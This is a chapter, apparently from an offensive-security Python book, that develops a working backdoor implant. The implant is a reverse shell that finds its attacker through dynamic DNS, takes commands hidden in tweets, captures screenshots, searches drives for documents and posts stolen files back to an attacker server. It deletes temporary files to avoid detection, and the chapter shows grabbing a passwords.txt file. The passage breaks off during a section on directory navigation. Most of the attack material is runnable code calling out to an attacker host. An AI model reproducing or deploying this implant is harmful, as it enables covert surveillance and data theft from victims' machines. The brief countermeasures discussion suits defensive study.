<html><head></head><body>
        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Advanced Scriptable Shell</h1>
                
            
            <article>
                
<p class="calibre2">The problem with the back door, which we created in the previous chapter, is that if the attacker IP changes we don't have a built-in mechanism to inform our target that it should connect to the new IP address. In this chapter we will look into a method that lets you keep a fixed reserved name for your attacker machine even if its IP changes.</p>
<p class="calibre2"><span class="calibre11">The following are the topics that will be covered in this chapter:</span> </p>
<ul class="calibre9">
<li class="calibre10">Dynamic DNS</li>
<li class="calibre10">Interacting with Twitter</li>
<li class="calibre10">Replicating Metasploit's screen capturing</li>
<li class="calibre10">Replicating Metasploit searching for content</li>
<li class="calibre10">Integrating a low-level port scanner</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Dynamic DNS</h1>
                
            
            <article>
                
<p class="calibre2">Now, one of the methods we'll discuss here is dynamic DNS. Let's say that the attacker IP is <kbd class="calibre12">1.1.1.1</kbd> on day 1. Then, the next day, we get an IP address of <kbd class="calibre12">2.2.2.2</kbd>. Then, how would our target know the new IP address ? The answer is <strong class="calibre4">dynamic DNS</strong> (<strong class="calibre4">DDNS</strong>). It is a method to preserve a unique name for you on a DNS server. While the reserved name is fixed, the correlated IP address will change each time you change your public IP address. For demonstration, we will use <a href="https://www.noip.com/" target="_blank" class="calibre8">noip.com</a>. It provides a free dynamic DNS service. So I have previously preserved a name called <kbd class="calibre12">pythonhussam.ddns.net</kbd>. So on the target side, instead of hard-coding the IP address on that script, we will do a DNS lookup for this name; then we will retrieve the IP address to make the connection. Now, you're probably asking: When the attacker IP address changes, how does <a href="https://www.noip.com/" target="_blank" class="calibre8">noip.com</a> know the new IP address to update its DNS record? Well, the answer is via a software agent, which should be installed on our Kali machine. The agent will connect to <a href="https://www.noip.com/" target="_blank" class="calibre8">noip.com</a> servers, and let them know our new IP address.</p>
<p class="calibre2">To save time, you can create a free account on <a href="https://www.noip.com/" target="_blank" class="calibre8">noip.com</a>. It should be quite simple and straightforward. Then, reserve a name of your choice, In the next section, we will install <strong class="calibre4">No-IP agent</strong> on our Kali Linux and modify the code in our previous TCP reverse shell version to resolve a DNS lookup on <kbd class="calibre12">pythonhussam.ddns.net</kbd>, which will be the reserved name that we will use for demonstration purposes. </p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">DNS aware shell</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will start by installing the No-IP agent on our Kali Linux machine. E<span class="calibre11">nsure that our Kali machine is connected to the internet so that we can download and install the agent software:</span></p>
<ol class="calibre13">
<li value="1" class="calibre10">Parse to <kbd class="calibre12">/usr/local/src/</kbd> by executing:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">cd <span>/usr/local/src/</span></strong></pre>
<ol start="2" class="calibre13">
<li value="2" class="calibre10">Download the agent software:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">wget http://www.no-ip.com/client/linux/noip-duc-linux.tar.gz</strong></pre>
<ol start="3" class="calibre13">
<li value="3" class="calibre10">Extract the file:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">tar xf noip-duc-linux.tar.gz</strong></pre>
<ol start="4" class="calibre13">
<li value="4" class="calibre10"><kbd class="calibre12">cd</kbd> into the <kbd class="calibre12">noip</kbd> folder we just extracted:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">cd noip-2.1.9-1/</strong></pre>
<ol start="5" class="calibre13">
<li value="5" class="calibre10">Install the agent:</li>
</ol>
<pre class="calibre43"><strong class="calibre1">make install</strong></pre>
<p class="calibre2">So, at this point, it'll prompt you to enter your <kbd class="calibre12">email</kbd> and <kbd class="calibre12">password</kbd>, which you used to register on the <a href="http://noip.com" class="calibre8">noip.com</a> website. So I'll type my email address here. And now we can see that <kbd class="calibre12">pythonhussam.ddns.net</kbd> is already registered to our account, and a new configuration file has been created:</p>
<div class="packt_figure1"><img src="../images/00037.jpeg" class="calibre44"/></div>
<p class="calibre2">Now, let's jump to the target machine. In Python, it's very simple<span class="calibre11"> to do a DNS lookup</span>. It's just a matter of a single line to resolve the IP address, and we will do that using either <kbd class="calibre12">socket.gethostname</kbd> or <kbd class="calibre12">socket.gethostbyname</kbd>, as shown in the following code:</p>
<pre class="packt_figure2">'''<br class="title-page-name"/>Caution<br class="title-page-name"/>--------<br class="title-page-name"/>Using this script for any malicious purpose is prohibited and against the law. Please read no-ip.com terms and conditions carefully. <br class="title-page-name"/>Use it on your own risk. <br class="title-page-name"/>'''<br class="title-page-name"/><br class="title-page-name"/># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># DDNS Aware Shell<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>import subprocess <br class="title-page-name"/>import os<br class="title-page-name"/><br class="title-page-name"/>...<br class="title-page-name"/><br class="title-page-name"/>def connect(ip):<br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br class="title-page-name"/>    s.connect((ip, 8080)) # instead of hardcoding the ip addr statically we pass our ip variable <br class="title-page-name"/><br class="title-page-name"/>...<br class="title-page-name"/><br class="title-page-name"/>def main ():<br class="title-page-name"/>    ip = socket.gethostbyname('pythonhussam.ddns.net') # We will use the os to send out a dns query for pythonhussam.ddns.net<br class="title-page-name"/>    print "Resolved IP was: " + ip # Please don't forget to change this name to yours :D<br class="title-page-name"/>    connect(ip) # we will pass the ip variable which contains the attacker ip to connect function <br class="title-page-name"/>main()</pre>
<p class="calibre2">Then, we store the result, which is the IP address of the attacker machine, in a variable called <kbd class="calibre12">ip</kbd>. For now, we will just comment the <kbd class="calibre12">connect(ip)</kbd> function and print out the result, just to make sure that our script is working fine here. So we'll run the module, and it says the IP address is <kbd class="calibre12">37.202.101</kbd>, as shown here:</p>
<pre class="packt_figure"><strong class="calibre1">&gt;&gt;&gt;</strong><br class="title-page-name"/><strong class="calibre1">Attacker IP is: 37.202.101.240</strong><br class="title-page-name"/><strong class="calibre1">&gt;&gt;&gt;</strong></pre>
<p class="calibre2">Let's go back to the attacker machine and verify our public IP address by searching <kbd class="calibre12">what is my ip address</kbd> in Google. If everything goes well we will see the same address that the target identified as the updated public IP address of the attacker machine.</p>
<p class="calibre2">So since the IP variable stores our attacker IP, we will pass this value into the connect function and use this value to connect back to the attacker machine.</p>
<div class="packt_infobox">Note that we have replaced the static IP address in <kbd class="calibre22">s.connect((ip, 8080))</kbd>  with a variable called <kbd class="calibre22">ip</kbd>.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Interacting with Twitter</h1>
                
            
            <article>
                
<p class="calibre2">Now, we will discuss a technique that is used frequently these days: relying on well-known servers to perform certain tasks or transfer a piece of information. This technique has been used by a Russian malware. What the attackers did was they sent the data over their Twitter account and made the target parse it later on. So, on the attacker machine, we just send an order or command as a normal tweet to our Twitter account. Note that there is no direct communication between the attacker and its target, which is really evil here. Later on, the target will parse the tweet and execute that order. The benefits of doing this is are:</p>
<ul class="calibre9">
<li class="calibre10">Twitter is a trusted website and it has a very good reputation; most likely, it's a whitelisted website</li>
<li class="calibre10">This type of attack is very hard to detect, where an unskilled security team would never have thought that this data could be malicious—and one of my goals here is to open your eyes to such malicious attacks</li>
</ul>
<p class="calibre2">In the next section, from the Kali machine we will send <kbd class="calibre12">hello</kbd> from the Python string as a normal tweet to our account. On the client side, we will parse the tweet, then we will print out the result.</p>
<div class="packt_tip">Now, technically speaking, anybody can view your tweet without even logging into Twitter. I recommend you read the FireEye report to see how attackers took advantage of this situation, <a href="https://www2.fireeye.com/APT29-HAMMERTOSS-WEB-2015-RPT.html" class="calibre6">https://www2.fireeye.com/APT29-HAMMERTOSS-WEB-2015-RPT.html</a><span>.</span></div>
<p class="calibre2">Believe it or not, in five lines of Python script, you will connect to the attacker page over HTTPS retrieve the HTML and parse it and finally extract the data from the tweet.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Parsing a tweet in three lines</h1>
                
            
            <article>
                
<p class="calibre2">For this demonstration, I created an account on Twitter. My profile name is <kbd class="calibre12">@HussamKhrais</kbd>.</p>
<p class="calibre2">So, I will log into my Twitter account from the Kali machine and send a tweet, and we will see how easy it is to grab that tweet from the target machine. So let's get started by first<span class="calibre11"> composing a new tweet (for example </span><kbd class="calibre12">Hello from kali python</kbd><span class="calibre11">) and log out from the account. </span><span class="calibre11">Let's now have a quick look at the HTML page that gets created after posting the tweet, by viewing the page source. Search and find the the tweet we just made. </span>Then, if we scroll to the left a little bit, notice the HTML meta tag parameters:</p>
<pre class="packt_figure">&lt;meta name="description" content="The latest Tweets from Hussam Khrais (@HussamKhrais): &amp;quot;Hello from kali python&amp;quot;"&gt;</pre>
<p class="calibre2">The first parameter, <kbd class="calibre12">name</kbd>, has <kbd class="calibre12">description</kbd> as a value,  and the second parameter called <kbd class="calibre12">content</kbd> contains our tweet. Now, we'll use these HTML tags to parse the HTML and extract the tweet eventually.</p>
<p class="calibre2">Python has a library called Beautiful Soup, which is a very well-known tool used to parse HTML pages. You can download it from: <a href="https://pypi.python.org/pypi/BeautifulSoup/" class="calibre8">https://pypi.python.org/pypi/BeautifulSoup/</a>.</p>
<p class="calibre2">To install this library, just navigate to the directory where Beautiful Soup exists, then run <kbd class="calibre12">python setup.py</kbd> and install it.</p>
<p class="calibre2">Let's have a quick look at the code, which we will use on the target side:</p>
<pre class="packt_figure2">'''<br class="title-page-name"/>Caution<br class="title-page-name"/>--------<br class="title-page-name"/>Using this script for any malicious purpose is prohibited and against the law. Please read Twitter terms and conditions carefully. <br class="title-page-name"/>Use it on your own risk. <br class="title-page-name"/>'''<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Tweets Grabber<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>from BeautifulSoup import BeautifulSoup as soupy<br class="title-page-name"/>import urllib<br class="title-page-name"/>import re<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>html = urllib.urlopen('https://twitter.com/HussamKhrais').read()<br class="title-page-name"/>soup = soupy(html)<br class="title-page-name"/>#Navigate to my twitter home page HussamKhrais, store the HTML page into html variable and pass it<br class="title-page-name"/>#to soupy function so we can parse it<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>x = soup.find("meta", {"name":"description"})['content']<br class="title-page-name"/>print x<br class="title-page-name"/>#Here we search for specific HTML meta tags, please see the video to know how did i find these parameters :) <br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>filter = re.findall(r'"(.*?)"',x) # After parsing the html page, our tweet is located between double quotations<br class="title-page-name"/>tweet = filter[0] # using regular expression we filter out the tweet <br class="title-page-name"/>print tweet<br class="title-page-name"/><br class="title-page-name"/></pre>
<p class="calibre2">So using <kbd class="calibre12">urllib</kbd> or the URL library, we'll browse to my Twitter home page. And once we retrieve the HTML page, we'll store it on the <kbd class="calibre12">html</kbd> variable. Then, we pass the HTML page or a variable to the <kbd class="calibre12">soupy</kbd> function.  Remember the HTML meta tag that contains our tweet? We will look for it using the <kbd class="calibre12">find</kbd> function in Beautiful Soup. So, we will look for a <kbd class="calibre12">meta name</kbd> and a value of <kbd class="calibre12">description</kbd>. Using a regular expression, we will do a final filter to print only the exact string between the quotation mark, which is basically the tweet that we sent. On running the script you will see that we got back the same tweet that we sent.</p>
<p class="calibre2">So, we will clean the code a little bit by removing the <kbd class="calibre12">print x</kbd> command. We will log into the Twitter account one more time and send another tweet. This time, we will tweet <kbd class="calibre12">We made it</kbd>. So, on the target side, we should be able to view the latest tweet on running the script.</p>
<p class="calibre2">Keep in mind that we were able to get the tweet without any login or authentication. Now, in the next section, you will see how you could use this information or script in a real-world scenario.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Countermeasures</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we'll discuss possible countermeasures for malware that is designed to interact with Twitter. Now, notice that I said a possible countermeasure, because this is not an easy job to do; and that's because of one of the following reasons:</p>
<ul class="calibre9">
<li class="calibre10">Blocking Twitter</li>
<li class="calibre10">Terminating SSL</li>
</ul>
<p class="calibre2">The first thing that may come to your mind is to simply block Twitter, and this will definitely prevent the attack. However, what if you work for a social marketing company or your daily job involves the use of Twitter? Then in this case, it's not an option. Also, it's not only limited to Twitter. Imagine that the target downloads an image from Instagram, and then, using stenography, the target parses a hidden text or hidden command within that image. The second point you might think about is, we have seen that the Twitter home page is using HTTPS, where the traffic is encrypted. And you might think that we can simply terminate the SSL and see the traffic in clear text. So let's assume that we have such a device for decryption, and we can see the tweet as clear text and the transit path. But the question is: What resources do we need to check each single packet going back and forth from our network to Twitter, as it could be 100 MB of data? Also, how we can distinguish between the good and the bad one?</p>
<p class="calibre2">So let's say that we have a tweet saying, <kbd class="calibre12">Follow this website</kbd>. So how can we tell that this is a malicious or innocent site, without actively inspecting that website? And overall, this will be a bigger headache in our process. Another point to consider here is: What if the tweet itself was encrypted? So, instead of seeing hello world or <kbd class="calibre12">ipconfig</kbd>, the attacker could encrypt this tweet in AES and send it to Twitter, and decrypt it back once it reaches the target side.</p>
<p class="calibre2">Also, what the attacker can do is mislead anyone watching the traffic. He can make the malware parse hundreds of Twitter pages in addition to the hacker page, and this leads us back into the resource issue which we discussed. Last but not least, the attacker can tweet another IP to create a chain of connections. If you read the report from FireEye on how the Russian malware works, then you will see that the attackers tweeted a link for an image located on GitHub. So, the victim initiated a new session to GitHub, and that's what's called a <strong class="calibre4">chained connection</strong>.</p>
<p class="calibre2">So if we think again about how we get infected with this malware, it will tell us that the same countermeasures we discussed in the previous chapter are still valid in our current scenario.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Replicating Metasploit's screen capturing</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will automate capturing a screenshot from the target machine and retrieve it over HTTP reverse shell. Getting a screenshot from the target <kbd class="calibre12">Desktop</kbd> can be useful to see what programs and activities are going on on the target side. In Metasploit Meterpreter, there is a function called <strong class="calibre4"><kbd class="calibre12">screengrab()</kbd></strong>, which will take a snapshot from the target machine and transfer it back to the attacker machine. So here, we will do something similar in our existing HTTP shell. For this purpose, we will be using a library called <kbd class="calibre12">Pillow</kbd> at the target. This is a high-level image library in Python. The installation is quite simple. You just need to run <kbd class="calibre12">pip install Pillow</kbd> via <kbd class="calibre12">cmd</kbd>.</p>
<p class="calibre2">Before doing that, just make sure that you have internet access. O<span class="calibre11">nce we install this library, I will go to</span> <span class="calibre11">Devices|Network|Network Settings...</span> in VirtualBox, and <span class="calibre11">change the network mode back to <span class="calibre11">Internal Network</span> as we did in the previous chapter. </span><span class="calibre11">We will also give our target the static IP address so that we can reach out to the attacker machine. </span></p>
<p class="calibre2"><span class="calibre11">Make sure that we got a connection with our attacker by pinging its IP address . </span></p>
<p class="calibre2">In our HTTP code, we start by importing our library. So we import the <kbd class="calibre12">ImageGrab()</kbd> function and we need to add a new <kbd class="calibre12">if</kbd> statement saying that, if we received a <kbd class="calibre12">screencap</kbd> keyword, then we will take a snapshot and save it to the current working directory with the name <kbd class="calibre12">img.jpg</kbd>. <span class="calibre11">Then, we will transfer it back to the attacker machine:</span></p>
<pre class="packt_figure2"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Screen Capturing<br class="title-page-name"/><br class="title-page-name"/>import requests <br class="title-page-name"/>import subprocess <br class="title-page-name"/>import os<br class="title-page-name"/>import time<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>from PIL import ImageGrab # Used to Grab a screenshot<br class="title-page-name"/><br class="title-page-name"/>while True: <br class="title-page-name"/><br class="title-page-name"/>    req = requests.get('http://10.0.2.15')<br class="title-page-name"/>    command = req.text<br class="title-page-name"/>        <br class="title-page-name"/>    if 'terminate' in command:<br class="title-page-name"/>        break<br class="title-page-name"/><br class="title-page-name"/>    elif 'grab' in command:<br class="title-page-name"/>        grab,path=command.split('*')<br class="title-page-name"/>        if os.path.exists(path):<br class="title-page-name"/>            url = 'http://10.0.2.15/store'<br class="title-page-name"/>            files = {'file': open(path, 'rb')}<br class="title-page-name"/>            r = requests.post(url, files=files)<br class="title-page-name"/>        else:<br class="title-page-name"/>            post_response = requests.post(url='http://10.0.2.15', data='[-] Not able to find the file !' )<br class="title-page-name"/>            <br class="title-page-name"/><br class="title-page-name"/>    elif 'screencap' in command: #If we got a screencap keyword, then .. <br class="title-page-name"/>        ImageGrab.grab().save("img.jpg", "JPEG")<br class="title-page-name"/>        url = 'http://10.0.2.15/store' <br class="title-page-name"/>        files = {'file': open("img.jpg", 'rb')}<br class="title-page-name"/>        r = requests.post(url, files=files) #Transfer the file over our HTTP<br class="title-page-name"/>             <br class="title-page-name"/>    else:<br class="title-page-name"/>        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br class="title-page-name"/>        post_response = requests.post(url='http://10.0.2.15', data=CMD.stdout.read() )<br class="title-page-name"/>        post_response = requests.post(url='http://10.0.2.15', data=CMD.stderr.read() )<br class="title-page-name"/><br class="title-page-name"/>    time.sleep(3)</pre>
<p class="calibre2">Let's now try and test the script. Ensure the HTTP Data Exfiltration Server script is running at the attacker end. Once we get the <kbd class="calibre12">Shell&gt;</kbd> run <kbd class="calibre12">screencap</kbd> at the attacker go to the <kbd class="calibre12">Desktop</kbd> and change the file extension to <kbd class="calibre12">.jpeg</kbd> so that we will be able to view the screenshot. If we go to the target machine, you will see that our <kbd class="calibre12">screencap</kbd> image is saved on the same current working directory as our script.</p>
<p class="calibre2">Now, the problem with this is that it's very obvious that someone is doing some malicious activity on our PC. Even if we remove the image after doing the transfer, there is still a chance that the target could catch us. Now, to overcome this, we will use the OS's <kbd class="calibre12">temp</kbd> directory to create a temporary directory and save the image over there. And once the transfer is completed, we will remove the entire directory.</p>
<p class="calibre2">Python has a built-in library that uses the operating system's temporary directory. Let's have a quick look. We will go to Command Prompt and open a Python interactive mode and run <kbd class="calibre12">import tempfile</kbd>. This <kbd class="calibre12">tempfile</kbd> will handle the task of creating a <kbd class="calibre12">temporary</kbd> directory. But before creating one, open the Windows <kbd class="calibre12">temp</kbd> directory. Run <kbd class="calibre12">print tempfile.mkdtemp</kbd>, which will make a temporary directory for us and print out all the directory names. Now, to get rid of this temporary directory, we will use another library called <kbd class="calibre12">shutil</kbd>. We will <kbd class="calibre12">import</kbd> this one and we will create a new temporary directory.</p>
<p class="calibre2">Notice that, once we do this, a new folder is created in the <kbd class="calibre12">temp</kbd> directory. Now, we will remove it by running <kbd class="calibre12">shutil.rmtree(x)</kbd> since the variable <kbd class="calibre12">x</kbd> contains the name of that <kbd class="calibre12">temp</kbd> folder:</p>
<div class="packt_figure1"><img src="../images/00038.jpeg" class="calibre33"/></div>
<p class="calibre2">To reflect these changes in our script, we will just go back and edit our target script:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Screen Capturing<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>import requests <br class="title-page-name"/>import subprocess <br class="title-page-name"/>import os<br class="title-page-name"/>import time<br class="title-page-name"/><br class="title-page-name"/>from PIL import ImageGrab # Used to Grab a screenshot<br class="title-page-name"/>import tempfile # Used to Create a temp directory<br class="title-page-name"/>import shutil # Used to Remove the temp directory<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>while True: <br class="title-page-name"/><br class="title-page-name"/>    req = requests.get('http://10.0.2.15')<br class="title-page-name"/>    command = req.text<br class="title-page-name"/>        <br class="title-page-name"/>    if 'terminate' in command:<br class="title-page-name"/>        break<br class="title-page-name"/><br class="title-page-name"/>    elif 'grab' in command:<br class="title-page-name"/>        grab,path=command.split('*')<br class="title-page-name"/>        if os.path.exists(path):<br class="title-page-name"/>            url = 'http://10.0.2.15/store'<br class="title-page-name"/>            files = {'file': open(path, 'rb')}<br class="title-page-name"/>            r = requests.post(url, files=files)<br class="title-page-name"/>        else:<br class="title-page-name"/>            post_response = requests.post(url='http://10.0.2.15', data='[-] Not able to find the file !' )<br class="title-page-name"/>            <br class="title-page-name"/><br class="title-page-name"/>    elif 'screencap' in command: #If we got a screencap keyword, then ...<br class="title-page-name"/>        <br class="title-page-name"/>        dirpath = tempfile.mkdtemp() #Create a temp dir to store our screenshot file<br class="title-page-name"/><br class="title-page-name"/>        ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG") #Save the screencap in the temp dir<br class="title-page-name"/><br class="title-page-name"/>        url = 'http://10.0.2.15/store' <br class="title-page-name"/>        files = {'file': open(dirpath + "\img.jpg", 'rb')}<br class="title-page-name"/>        r = requests.post(url, files=files) #Transfer the file over our HTTP<br class="title-page-name"/>        <br class="title-page-name"/>        files['file'].close() #Once the file gets transferred, close the file.<br class="title-page-name"/>        shutil.rmtree(dirpath) #Remove the entire temp dir<br class="title-page-name"/><br class="title-page-name"/>...</pre>
<p class="calibre2">First, we'll create a <kbd class="calibre12">temp</kbd> directory and store its path in the <kbd class="calibre12">dirpath</kbd> variable. Then, we will tell<kbd class="calibre12">ImageGrab</kbd> to save the <kbd class="calibre12">screencap</kbd> in the newly created <kbd class="calibre12">temp</kbd> directory. Also we'll modify the save directory. We will also need to reflect this change to the file transfer function, so it knows the new path for the image file. The last thing is, once the transfer gets completed, we have to make sure that the file gets closed since we cannot remove a file that is currently opened by an application or a process. We will delete the whole directory.</p>
<p class="calibre2">Give it a try, and verify that we didn't leave any track behind. Try a filter on <kbd class="calibre12">img</kbd> inside the <kbd class="calibre12">temp</kbd> directory, which is the filename or the image name, and we will see if anything shows up by running the script as we did before. Once we get the <kbd class="calibre12">Shell&gt;</kbd> at the attacker machine run a <kbd class="calibre12">screencap</kbd>. Once you get the screenshot on the attacker rename it, jump to the target side, and see if any file has been created. You will see that there is nothing there because we removed the <kbd class="calibre12">temp</kbd> directory after we did the transfer.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Replicating Metasploit searching for content</h1>
                
            
            <article>
                
<p class="calibre2">We will now code a Python function that will search into target directories and provide us with a list of file locations for a certain specific file extension. For instance, say we need to search for a PDF or document file on the target machine; instead of checking each directory, we will add a new function to automatically do the job for us. This is very useful when you first land in a target machine and try to explore as much data as possible such as documents, PDF files, and so on. The coding part is quite easy. We will use the Python <kbd class="calibre12">os</kbd> library to do the job for us. So, as usual, I have added a new <kbd class="calibre12">if</kbd> statement to specify that if we get a <kbd class="calibre12">search</kbd> keyword we will do the following:</p>
<pre class="packt_figure2"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Searching for Content<br class="title-page-name"/><br class="title-page-name"/>import requests <br class="title-page-name"/>import subprocess <br class="title-page-name"/>import os<br class="title-page-name"/>import time<br class="title-page-name"/><br class="title-page-name"/>while True: <br class="title-page-name"/><br class="title-page-name"/>    req = requests.get('http://10.0.2.15')<br class="title-page-name"/>    command = req.text<br class="title-page-name"/>        <br class="title-page-name"/>    if 'terminate' in command:<br class="title-page-name"/>        break <br class="title-page-name"/><br class="title-page-name"/>    elif 'grab' in command:<br class="title-page-name"/>        grab,path=command.split('*')<br class="title-page-name"/>        if os.path.exists(path):<br class="title-page-name"/>            url = 'http://10.0.2.15/store'<br class="title-page-name"/>            files = {'file': open(path, 'rb')}<br class="title-page-name"/>            r = requests.post(url, files=files)<br class="title-page-name"/>        else:<br class="title-page-name"/>            post_response = requests.post(url='http://10.0.2.15', data='[-] Not able to find the file !' )<br class="title-page-name"/>            <br class="title-page-name"/>    elif 'search' in command: # The Formula is search &lt;path&gt;*.&lt;file extension&gt; , for example let's say that we got search C:\\*.pdf<br class="title-page-name"/>        # if we remove the first 7 character the output would C:\\*.pdf which is basically what we need<br class="title-page-name"/><br class="title-page-name"/>        command = command[7:] # cut off the the first 7 character ,, output would be C:\\*.pdf<br class="title-page-name"/>        <br class="title-page-name"/>        path,ext=command.split('*') # split C:\\*.pdf into two sections, the first section (C:\\) will be stored in path variable and<br class="title-page-name"/>                                     # the second variable (.pdf) will be stored in ext variable<br class="title-page-name"/>        <br class="title-page-name"/>        list = '' # here we define a string where we will append our result on it<br class="title-page-name"/>        '''<br class="title-page-name"/>           os.walk is a function that will navigate ALL the directories specified in the provided path and returns three values:-<br class="title-page-name"/><br class="title-page-name"/>            dirpath is a string contains the path to the directory<br class="title-page-name"/>            dirnames is a list of the names of the subdirectories in dirpath<br class="title-page-name"/>            files is a list of the files name in dirpath<br class="title-page-name"/><br class="title-page-name"/>            Once we got the files list, we check each file (using for loop), if the file extension was matching what we are looking for, then<br class="title-page-name"/>            we add the directory path into list string. the os.path.join represents a path relative for our file to<br class="title-page-name"/>            the current directory and in our example it's the C:\\ directory<br class="title-page-name"/><br class="title-page-name"/>        '''<br class="title-page-name"/>        <br class="title-page-name"/><br class="title-page-name"/>        for dirpath, dirname, files in os.walk(path):<br class="title-page-name"/>            for file in files:<br class="title-page-name"/>                if file.endswith(ext):<br class="title-page-name"/>                    list = list + '\n' + os.path.join(dirpath, file)<br class="title-page-name"/>                    <br class="title-page-name"/>        requests.post(url='http://10.0.2.15', data= list ) # Send the search result<br class="title-page-name"/>...       </pre>
<p class="calibre2">So first, we define the format as <kbd class="calibre12">search C:\\*.pdf</kbd> . Note that we are only interested in the second part, which is the directory that we want to search and the file extension. Right now, to clean the <kbd class="calibre12">received</kbd> command and to split it into parameters, we will have to cut off the first leading seven characters; and we will do so to get rid of the unwanted search string and space. Now, if we count the first seven characters, it will be up to the <kbd class="calibre12">C</kbd> directory here; the output after doing that, will be much cleaner. Next, we split the string into path and file extensions, and we store them in path and extension variables. So the first parameter will be the <kbd class="calibre12">path</kbd>, which will be stored in the path variable, and the second one will be stored in the extension variable. Next, we define a list variable, and this one will be our placeholder to store the file directories. Now, the actual function that will do the search for us is the <kbd class="calibre12">os.walk(path)</kbd> function. This function will navigate all the directories specified in the provided <kbd class="calibre12">path</kbd> directory, and return three values: the <kbd class="calibre12">dirpath</kbd>, which is a string that contains the path to the directory; the <kbd class="calibre12">dirname</kbd> , which is a list of the names for the sub directories in the <kbd class="calibre12">dirpath</kbd>; and  finally <kbd class="calibre12">files</kbd>, which is a list of filenames in <kbd class="calibre12">dirpath</kbd>.</p>
<p class="calibre2">Next, we perform another loop to check each file in the <kbd class="calibre12">files</kbd> list. If the files end with our desired extension, such as <kbd class="calibre12">.pdf</kbd>, then we add the directory value into the list string. In the end, the <kbd class="calibre12">os.path.join()</kbd> <span class="calibre11">function </span>represents a path relative to our file to the current directory, and in our case, it's the <kbd class="calibre12">C:\</kbd> directory. Finally, we'll post the result back to the attacker side. </p>
<p class="calibre2">On running the script on both sides, as a start let's search for every PDF file in the <kbd class="calibre12">C:\</kbd> directory by running:</p>
<pre class="packt_figure"><strong class="calibre1">search C:\*.pdf<br class="title-page-name"/></strong></pre>
<p class="calibre2">After this let's try to grab <kbd class="calibre12">Documents\Module 3.pdf</kbd>:</p>
<pre class="packt_figure"><strong class="calibre1">grab*C:\Users\hkrais\Documents\Module 3.pdf</strong></pre>
<p class="calibre2">We can also search for each text file in the system. It should be a huge list:</p>
<pre class="packt_figure"><strong class="calibre1">search C:\*.txt</strong></pre>
<p class="calibre2">We can narrow down our search, and just do a search for the <kbd class="calibre12">Desktop</kbd> directory.</p>
<pre class="packt_figure"><strong class="calibre1">search C:\Users\hkrais\Desktop\.txt</strong></pre>
<p class="calibre2">And we have a file there called <kbd class="calibre12">passwords.txt</kbd>. Try to grab that one, and verify its content as we did in the previous chapter. </p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Target directory navigation</h1>
                
            
            <article>
                
<p class="calibre2">We will now address a directory navigation issue. Now, the problem is that browsing directories is restricted to the shell working directories. For instance, if the target has executed our Python script on the <kbd class="calibre12">Desktop</kbd>, then our working directory will be the <kbd class="calibre12">Desktop</kbd>. And due to shell limitations, we cannot simply type <kbd class="calibre12">cd</kbd> and move on to another directory. Remember we learned that some commands won't work in a shell, and <kbd class="calibre12">cd</kbd> is one of them.</p>
<p class="calibre2">Once we run our previous TCP reverse shell on both sides, you will see our current working directory is on the <kbd class="calibre12">Desktop</kbd>, where our Python exists. Notice what will happen when a <kbd class="calibre12">cd</kbd> command is issued to change the current working directory to <kbd class="calibre12">C:\Users</kbd>. Our script will become non-responsive once we try the <kbd class="calibre12">cd C:\Users</kbd> command, and this is because the shell fails to handle the <kbd class="calibre12">cd</kbd> command properly. Now, to overcome this problem, we need to explicitly tell the script to change its working directory. Again, that's because our shell working directory is restricted to the working directory of our Python script.</p>
<p class="calibre2">The formula here will be <kbd class="calibre12">cd</kbd> followed by space, then the path that we want to go to. Then, we will split up the received command based on the space into two variables. Thankfully, changing the directory is a matter of a single line in Python. Finally, we send back a string mentioning the new current working directory:</p>
